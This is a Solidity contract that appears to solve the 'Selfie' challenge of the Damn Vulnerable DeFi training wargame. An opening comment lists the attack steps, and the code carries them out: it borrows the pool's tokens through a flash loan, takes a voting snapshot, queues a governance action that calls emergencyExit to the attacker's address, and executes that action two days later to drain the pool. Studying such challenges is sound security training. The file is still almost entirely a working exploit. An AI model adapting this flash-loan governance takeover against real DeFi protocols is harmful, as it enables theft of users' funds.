// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

import "./ISimpleGovernance.sol" ;
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
/* 
Attack plan

1. take a flash loan -- from selfiePool

2. take snapshot on the token contract & payback the loan

3. call 'queueAction' on the governance contract -- with the target address = SelfiePool address
                                                 and data crafted to call the "emergencyExit" with attacker address as the argument


4. let 2 days pass -- skip 2 days on foundry

5. Now call "executeAction" on the governance contract

6. you just took all the funds
*/


interface ISelfiePool {

    function maxFlashLoan(address _token) external view returns (uint256);

    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external  returns (bool);
}

    contract Attack is IERC3156FlashBorrower {

    ISimpleGovernance public governance;
    ISelfiePool public flashPool;
    DamnValuableTokenSnapshot public token;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    uint256 public snapshotId;
    uint256 public actionId; 

    constructor (address _flashPool, address _governAddress, address _token) {

        governance = ISimpleGovernance(_governAddress);
        flashPool = ISelfiePool(_flashPool);
        token = DamnValuableTokenSnapshot(_token);
    }

    function attack1() public {

        uint256 amountToLoan = flashPool.maxFlashLoan(address(token));
        flashPool.flashLoan(this, address(token), amountToLoan, ""); 

        bytes memory _data = abi.encodeWithSignature("emergencyExit(address)", address(this));
        actionId = governance.queueAction(address(flashPool), 0, _data);

    }

//  onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS
/* 
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data

*/

    function onFlashLoan(address _initiator, address _token, uint256 _amount, uint256 _fee, bytes calldata _data) public returns(bytes32){

            snapshotId = token.snapshot();
            token.approve(address(flashPool), token.balanceOf(address(this)));            
            return CALLBACK_SUCCESS;
    }


    function attack2After2Days() public {

        governance.executeAction(actionId);
    }

}